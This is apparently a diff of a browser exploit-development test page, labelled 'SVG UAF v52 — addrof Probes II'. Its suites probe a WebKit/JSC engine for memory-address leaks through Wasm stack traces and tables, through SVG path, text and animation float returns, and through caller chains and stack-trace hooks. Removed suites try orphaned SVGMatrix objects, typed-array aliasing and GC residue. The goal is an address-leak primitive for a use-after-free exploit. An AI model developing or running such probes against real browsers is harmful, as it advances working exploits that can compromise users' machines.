+    var exports=inst.exports;
+    L('ADR7: Wasm module instantiated');
+    L('ADR7: exports: '+Object.keys(exports).join(', '));
 
-  // Test 4: Float64Array + SVGMatrix — can they share memory?
-  // Create Float64Array with known values, then create SVGMatrix
-  // If they're adjacent, writing past Float64Array end would hit SVGMatrix
-  // We can't do OOB in JS. But: can we get Float64Array.buffer ptr from SVGMatrix?
-  // Set up: SVGMatrix with values matching Float64Array entries
-  var fa2=new Float64Array([1.1,2.2,3.3,4.4,5.5,6.6]);
-  var svg=makeSVG();
-  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
-  var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
-  var m=g.transform.baseVal.getItem(0).matrix;
-  // Copy Float64Array values into SVGMatrix
-  m.a=fa2[0];m.b=fa2[1];m.c=fa2[2];m.d=fa2[3];m.e=fa2[4];m.f=fa2[5];
-  L('OBJ7: [T4] SVGMatrix loaded with Float64Array values: a='+m.a+' b='+m.b);
-  // Orphan matrix
-  g.transform.baseVal.removeItem(0);g.parentNode.removeChild(g);removeSVG(svg);
-  // Can we still do oracle on orphaned matrix loaded from Float64Array?
-  try{
-    var inv=m.inverse();
-    L('OBJ7: [T4] orphaned matrix inverse: a='+m.a+' inv.a='+inv.a);
-  }catch(ex){L('OBJ7: [T4] THREW: '+ex.message);}
+    // Read global value
+    try{
+      var gval=exports.g.value;
+      L('ADR7: global g = '+gval+' (0x'+gval.toString(16)+') expected=0xdeadbeef match='+(gval===0xdeadbeef));
+    }catch(ex){L('ADR7: global read: '+ex.message);}
 
-  // Test 5: TypedArray view aliasing
-  // Uint32Array and Float64Array over same ArrayBuffer
-  var ab=new ArrayBuffer(64);
-  var u32=new Uint32Array(ab);
-  var f64=new Float64Array(ab);
-  // Write a "pointer" value as two uint32s, read as float64
-  var hi=0x41f8,lo=0x00123456; // encodes a ~6442455126 f64
-  u32[0]=lo;u32[1]=hi<<16;     // little-endian: lo at 0, hi at 4
-  L('OBJ7: [T5] aliased view: u32[0]=0x'+u32[0].toString(16)+' u32[1]=0x'+u32[1].toString(16)+' → f64[0]='+f64[0]);
+    // Call exported fn — it will call js_throw from inside Wasm
+    try{
+      exports.call_throw();
+    }catch(err){
+      L('ADR7: caught from Wasm call: '+err.message);
+      var stk=err.stack||'';
+      L('ADR7: stack:\n'+stk.slice(0,600));
+      // Look for hex addresses
+      var hexPats=stk.match(/0x[0-9a-f]{6,}/gi)||[];
+      L('ADR7: hex patterns in Wasm stack: '+hexPats.length+(hexPats.length>0?' first='+hexPats[0]:''));
+      for(var i=0;i<hexPats.length;i++) L('ADR7: ★ '+hexPats[i],'hit');
+      // Look for wasm: lines which sometimes include byte offsets
+      var wasmLines=stk.split('\n').filter(function(l){return l.indexOf('wasm')>=0||l.indexOf('@[')>=0;});
+      L('ADR7: wasm-related stack lines: '+wasmLines.length);
+      for(var i=0;i<wasmLines.length;i++) L('ADR7: wasm-line: '+wasmLines[i]);
+    }
 
-  // Write known pointer-like value via float64, read as u32 pair
-  f64[1]=0x1b0001234; // pointer-like value
-  L('OBJ7: [T5b] f64=0x1b0001234 → u32[2]=0x'+u32[2].toString(16)+' u32[3]=0x'+u32[3].toString(16));
-  // Verify round-trip
-  var dv2=new DataView(ab);
-  var lo2=dv2.getUint32(8,true);var hi2=dv2.getUint32(12,true);
-  L('OBJ7: [T5c] round-trip: hi=0x'+hi2.toString(16)+' lo=0x'+lo2.toString(16));
-  L('OBJ7: done');
+    // Table: can we get function pointer?
+    try{
+      var tbl=exports.t;
+      var fn=tbl.get(0);
+      L('ADR7: table[0]='+fn+' type='+typeof fn);
+      if(fn){
+        // try to extract address from fn.toString()
+        var fnStr=fn.toString();
+        L('ADR7: table fn.toString(): '+fnStr.slice(0,100));
+        var fnHex=(fnStr.match(/0x[0-9a-f]{6,}/gi)||[]);
+        L('ADR7: hex in table fn.toString: '+fnHex.length+(fnHex.length>0?' '+fnHex[0]:''));
+      }
+    }catch(ex){L('ADR7: table access: '+ex.message);}
+
+    // Wasm memory probe — does mem object expose ptr?
+    var mem=new WebAssembly.Memory({initial:1});
+    L('ADR7: memory.buffer==ArrayBuffer: '+(mem.buffer instanceof ArrayBuffer));
+    // Check if memory.buffer.constructor.toString() leaks anything
+    L('ADR7: mem.buffer.constructor.name='+mem.buffer.constructor.name);
+
+  }).catch(function(err){
+    L('ADR7: Wasm compile/instantiate failed: '+err.message,'miss');
+    L('ADR7: trying simpler module...');
+    // Absolute minimal: just a module with one func that returns i32
+    var minBytes=new Uint8Array([
+      0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+      0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
+      0x03,0x02,0x01,0x00,
+      0x07,0x07,0x01,0x03,0x61,0x64,0x64,0x00,0x00,
+      0x0a,0x06,0x01,0x04,0x00,0x41,0x2a,0x0b,
+    ]);
+    WebAssembly.instantiate(minBytes,{}).then(function(r2){
+      L('ADR7: minimal module OK, add()='+r2.instance.exports.add());
+    }).catch(function(e2){L('ADR7: minimal also failed: '+e2.message,'miss');});
+  });
 }
 
 // ─────────────────────────────────────────────────────────────────
-// OBJ8 — WeakRef / FinalizationRegistry / GC timing
-// WeakRef holds a weak reference — doesn't prevent GC
-// FinalizationRegistry: callback fires when object is collected
-// Can we time GC to infer heap layout?
+// ADR8 — SVGAnimationElement internal leak
+// SVGAnimationElement.getCurrentTime() — returns a float
+// SVGAnimationElement.getStartTime() — throws or returns float
+// SVGSMILElement timing engine uses internal clock objects
+// Does any timing return value carry C++ pointer bits?
+//
+// Also: SVGPathElement.getTotalLength(), getPointAtLength()
+// These call into C++ path geometry code — do they leak?
+//
+// Also: SVGTextElement.getStartPositionOfChar() — returns SVGPoint
+// with x/y from C++ text layout. Float32? Float64?
 // ─────────────────────────────────────────────────────────────────
-function runOBJ8(){
-  L('','suite-hdr');L('OBJ8: WeakRef / FinalizationRegistry / GC timing');
+function runADR8(){
+  L('','suite-hdr');L('ADR8: SVGAnimation / SVGPath / SVGText internal float leak');
 
-  // Test 1: WeakRef availability
-  if(typeof WeakRef==='undefined'){L('OBJ8: WeakRef not available','miss');return;}
-  L('OBJ8: WeakRef available');
-
-  // Test 2: FinalizationRegistry
-  if(typeof FinalizationRegistry==='undefined'){L('OBJ8: FinalizationRegistry not available','miss');}
-  else{
-    L('OBJ8: FinalizationRegistry available');
-    var collected=[];
-    var fr=new FinalizationRegistry(function(v){
-      collected.push(v);
-      L('OBJ8: ★ GC collected: '+v,'hit');
-    });
-    // Register some objects
-    (function(){
-      var objs=[];
-      for(var i=0;i<10;i++){
-        var o={id:i,data:new Array(100).fill(i)};
-        fr.register(o,'obj-'+i);
-        objs.push(o);
-      }
-      // Let objs go out of scope
-    })();
-    // Trigger GC
-    try{if(typeof gc==='function'){gc();L('OBJ8: gc() called');}}catch(e){}
-    // Note: callbacks are async, won't fire synchronously
-    L('OBJ8: collected so far (sync): '+collected.length+' (may fire later async)');
-  }
-
-  // Test 3: WeakRef deref timing
-  var wr=null;
-  (function(){var o={secret:42};wr=new WeakRef(o);})();
-  // o might be collected now
-  var deref=wr.deref();
-  L('OBJ8: WeakRef.deref() after scope exit: '+(deref?'still alive ('+deref.secret+')':'COLLECTED'));
-
-  // Test 4: GC timing oracle
-  // Alloc many SVGNumbers, orphan them, check if GC reclaims
-  // timing-based: if GC runs, performance.now() jumps
-  L('OBJ8: [T4] GC timing probe');
-  var t0=performance.now();
-  // Spray 1000 objects
-  var spray=[];
-  for(var i=0;i<1000;i++) spray.push({a:new Array(50).fill(i),b:i});
-  var t1=performance.now();
-  spray=null; // release
-  try{if(typeof gc==='function')gc();}catch(e){}
-  var t2=performance.now();
-  // Alloc SVGNumbers post-GC
   var svg=makeSVG();
-  var f=document.createElementNS(SVG_NS,'feColorMatrix');
-  f.setAttribute('type','matrix');f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','fg8');
-  filt.appendChild(f);svg.appendChild(filt);
-  var bl=f.values.baseVal;bl.clear();
-  var postGCRefs=[];
-  for(var i=0;i<20;i++){var n=getTmp().createSVGNumber();n.value=0;bl.appendItem(n);postGCRefs.push(bl.getItem(bl.length-1));}
-  filt.parentNode.removeChild(filt);
-  var t3=performance.now();
-  L('OBJ8: [T4] alloc='+((t1-t0).toFixed(2))+'ms release+gc='+((t2-t1).toFixed(2))+'ms svgAlloc='+((t3-t2).toFixed(2))+'ms');
+  svg.style.cssText='position:fixed;top:0;left:0;width:200px;height:200px;opacity:0;pointer-events:none';
+  svg.setAttribute('width','200');svg.setAttribute('height','200');
 
-  // Check if post-GC SVGNumbers have nonzero values (ptr residue)
-  var residue=0;
-  for(var i=0;i<postGCRefs.length;i++){var v=postGCRefs[i].value;if(v!==0){residue++;L('OBJ8: [T4] residue! ref['+i+']='+v,'hit');}}
-  L('OBJ8: [T4] residue count='+residue+' '+(residue>0?'★ PTR BITS SURVIVED GC!':'clean — fastMalloc zeroes confirmed'));
+  // SVGPathElement.getTotalLength() / getPointAtLength()
+  var path=document.createElementNS(SVG_NS,'path');
+  path.setAttribute('d','M 10 10 L 100 100 Q 200 200 300 100');
+  svg.appendChild(path);
+
+  try{
+    void svg.getBoundingClientRect(); // force layout
+    var len=path.getTotalLength();
+    L('ADR8: [path] getTotalLength='+len+' bits='+f64hex(len));
+    if(isPointerLike(len)) L('ADR8: ★ getTotalLength PTR-LIKE!','hit');
+
+    var pt=path.getPointAtLength(len/2);
+    L('ADR8: [path] getPointAtLength('+len/2+'): x='+pt.x+' y='+pt.y);
+    L('ADR8: [path] x_bits='+f64hex(pt.x)+' y_bits='+f64hex(pt.y));
+    // x/y are SVGPoint fields — float32
+    L('ADR8: [path] x f32 check: '+(pt.x===Math.fround(pt.x))+' y f32 check: '+(pt.y===Math.fround(pt.y)));
+  }catch(ex){L('ADR8: path ops: '+ex.message,'warn');}
+
+  // SVGTextElement.getStartPositionOfChar
+  var text=document.createElementNS(SVG_NS,'text');
+  text.setAttribute('x','10');text.setAttribute('y','50');
+  text.textContent='ABCDEF';
+  svg.appendChild(text);
+  try{
+    void svg.getBoundingClientRect();
+    var charPt=text.getStartPositionOfChar(0);
+    L('ADR8: [text] getStartPositionOfChar(0): x='+charPt.x+' y='+charPt.y);
+    L('ADR8: [text] x_bits='+f64hex(charPt.x)+' y_bits='+f64hex(charPt.y));
+    if(isPointerLike(charPt.x)) L('ADR8: ★ char x PTR-LIKE!','hit');
+    if(isPointerLike(charPt.y)) L('ADR8: ★ char y PTR-LIKE!','hit');
+    var extents=text.getExtentOfChar(0);
+    if(extents) L('ADR8: [text] getExtentOfChar: x='+extents.x+' y='+extents.y+' w='+extents.width+' h='+extents.height);
+  }catch(ex){L('ADR8: text ops: '+ex.message,'warn');}
+
+  // SVGAnimateElement timing
+  var anim=document.createElementNS(SVG_NS,'animate');
+  anim.setAttribute('attributeName','opacity');
+  anim.setAttribute('from','0');anim.setAttribute('to','1');
+  anim.setAttribute('dur','10s');anim.setAttribute('repeatCount','indefinite');
+  path.appendChild(anim);
+  try{
+    var ct=anim.getCurrentTime();
+    L('ADR8: [anim] getCurrentTime='+ct+' bits='+f64hex(ct));
+    if(isPointerLike(ct)) L('ADR8: ★ getCurrentTime PTR-LIKE!','hit');
+  }catch(ex){L('ADR8: getCurrentTime: '+ex.message);}
+  try{
+    var st=anim.getStartTime();
+    L('ADR8: [anim] getStartTime='+st+' bits='+f64hex(st));
+    if(isPointerLike(st)) L('ADR8: ★ getStartTime PTR-LIKE!','hit');
+  }catch(ex){L('ADR8: getStartTime: '+ex.message);}
+  try{
+    var st2=svg.getCurrentTime();
+    L('ADR8: [svg] getCurrentTime='+st2+' bits='+f64hex(st2));
+  }catch(ex){L('ADR8: svg.getCurrentTime: '+ex.message);}
+
+  // SVGPathSegList segment count probe
+  // SVGGeometryElement.isPointInFill — returns bool but takes SVGPoint
+  try{
+    var testPt=svg.createSVGPoint();testPt.x=50;testPt.y=50;
+    var inFill=path.isPointInFill(testPt);
+    L('ADR8: [path] isPointInFill(50,50)='+inFill);
+    var inStroke=path.isPointInStroke(testPt);
+    L('ADR8: [path] isPointInStroke(50,50)='+inStroke);
+  }catch(ex){L('ADR8: isPointIn*: '+ex.message);}
 
   removeSVG(svg);
-  L('OBJ8: done');
+  L('ADR8: done');
+}
+
+// ─────────────────────────────────────────────────────────────────
+// ADR9 — arguments.callee / Function.caller / stack depth
+// In non-strict mode, arguments.callee gives a reference to current fn
+// arguments.caller (non-standard) sometimes exposed
+// On old JSC builds: arguments.callee.caller leaked addresses
+// Also: Function.prototype.caller in non-strict context
+// Also: Error.captureStackTrace (V8 API — not JSC but let's check)
+// Also: eval("arguments") in non-strict embedded scope
+// ─────────────────────────────────────────────────────────────────
+function runADR9(){
+  L('','suite-hdr');L('ADR9: arguments.callee / caller / stack depth leak');
+
+  // Test 1: arguments.callee in non-strict function
+  var callee_works=false;
+  try{
+    (function(){
+      var c=arguments.callee;
+      callee_works=(typeof c==='function');
+      L('ADR9: [T1] arguments.callee: '+c.toString().slice(0,60)+' type='+typeof c);
+    })();
+  }catch(ex){L('ADR9: [T1] arguments.callee: '+ex.message,'warn');}
+  L('ADR9: [T1] callee_works='+callee_works);
+
+  // Test 2: Function.prototype.caller (non-strict)
+  function innerFn(){
+    try{
+      var c=innerFn.caller;
+      L('ADR9: [T2] caller='+c);
+      return c;
+    }catch(ex){L('ADR9: [T2] .caller threw: '+ex.message);}
+  }
+  (function outerFn(){innerFn();})();
+
+  // Test 3: arguments.callee.caller chain
+  try{
+    (function nonStrict1(){
+      (function nonStrict2(){
+        try{
+          L('ADR9: [T3] callee.name='+arguments.callee.name);
+          var caller=arguments.callee.caller;
+          L('ADR9: [T3] callee.caller='+caller);
+          if(caller) L('ADR9: [T3] callee.caller.name='+caller.name);
+        }catch(ex){L('ADR9: [T3] chain: '+ex.message);}
+      })();
+    })();
+  }catch(ex){L('ADR9: [T3] outer: '+ex.message);}
+
+  // Test 4: Error.captureStackTrace (V8)
+  L('ADR9: [T4] Error.captureStackTrace='+typeof Error.captureStackTrace);
+  L('ADR9: [T4] Error.prepareStackTrace='+typeof Error.prepareStackTrace);
+
+  // Test 5: custom Error.prepareStackTrace to intercept stack frames
+  var origPrepare=Error.prepareStackTrace;
+  var frameData=null;
+  try{
+    Error.prepareStackTrace=function(err,frames){
+      frameData=frames;
+      return frames.map(function(f){return f.toString();}).join('\n');
+    };
+    var e=new Error('probe');
+    var s=e.stack; // triggers prepareStackTrace
+    if(frameData){
+      L('ADR9: [T5] prepareStackTrace fired! frames='+frameData.length);
+      for(var i=0;i<Math.min(frameData.length,3);i++){
+        var fr=frameData[i];
+        L('ADR9: [T5] frame['+i+']: '+fr);
+        // Try to get function object from frame
+        try{
+          var fn=fr.getFunction&&fr.getFunction();
+          if(fn) L('ADR9: [T5] frame['+i+'].getFunction()='+fn);
+        }catch(ex){}
+        try{
+          var fnName=fr.getFunctionName&&fr.getFunctionName();
+          L('ADR9: [T5] frame['+i+'].getFunctionName()='+fnName);
+        }catch(ex){}
+        try{
+          var pos=fr.getPosition&&fr.getPosition();
+          L('ADR9: [T5] frame['+i+'].getPosition()='+pos);
+        }catch(ex){}
+      }
+    }else{
+      L('ADR9: [T5] prepareStackTrace NOT supported (JSC-specific, V8 only)');
+    }
+  }catch(ex){L('ADR9: [T5] prepareStackTrace: '+ex.message);}
+  finally{Error.prepareStackTrace=origPrepare;}
+
+  // Test 6: stack depth as timing oracle
+  // Deep recursion — does JSC expose depth anywhere?
+  var maxDepth=0;
+  try{
+    (function recurse(n){
+      maxDepth=n;
+      recurse(n+1);
+    })(0);
+  }catch(ex){
+    L('ADR9: [T6] stack overflow at depth='+maxDepth+' msg='+ex.message.slice(0,40));
+  }
+
+  // Test 7: Named capture group in RegExp — any address in match object?
+  try{
+    var re=/(?<x>a+)/;
+    var m=re.exec('aaaa');
+    if(m&&m.groups){
+      L('ADR9: [T7] named groups: x='+m.groups.x);
+      L('ADR9: [T7] groups obj constructor='+m.groups.constructor);
+    }
+  }catch(ex){L('ADR9: [T7] regex: '+ex.message);}
+
+  // Test 8: globalThis / window object — any internal address exposed?
+  try{
+    L('ADR9: [T8] typeof globalThis='+typeof globalThis);
+    var gt=globalThis;
+    // Does globalThis have any weird non-standard properties that look like ptrs?
+    var gtKeys=Object.getOwnPropertyNames(gt).filter(function(k){return k.startsWith('_')||k.startsWith('$');});
+    L('ADR9: [T8] globalThis unusual keys: '+gtKeys.slice(0,10).join(', ')||'none');
+  }catch(ex){L('ADR9: [T8]: '+ex.message);}
+
+  L('ADR9: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
 // RUN ALL
 // ─────────────────────────────────────────────────────────────────
-var suites={
-  OBJ3:runOBJ3,
-  OBJ4:runOBJ4,
-  OBJ6:runOBJ6,
-  OBJ7:runOBJ7,
-  OBJ8:runOBJ8
-};
+var suites={ADR6:runADR6,ADR7:runADR7,ADR8:runADR8,ADR9:runADR9};
 
 function runSuite(name){
   L('=== '+name+' ===','suite-hdr');
@@ -564,14 +567,14 @@ function runSuite(name){
 
 function runAll(){
   clearOut();
-  L('SVG UAF v51 — addrof Probes','suite-hdr');
+  L('SVG UAF v52 — addrof Probes II','suite-hdr');
   L('----------------------------------------------------');
   var names=Object.keys(suites);
   var i=0;
   function next(){
     if(i>=names.length){L('','suite-hdr');L('ALL SUITES COMPLETE');return;}
     runSuite(names[i++]);
-    setTimeout(next,50);
+    setTimeout(next,80);
   }
   next();
 }
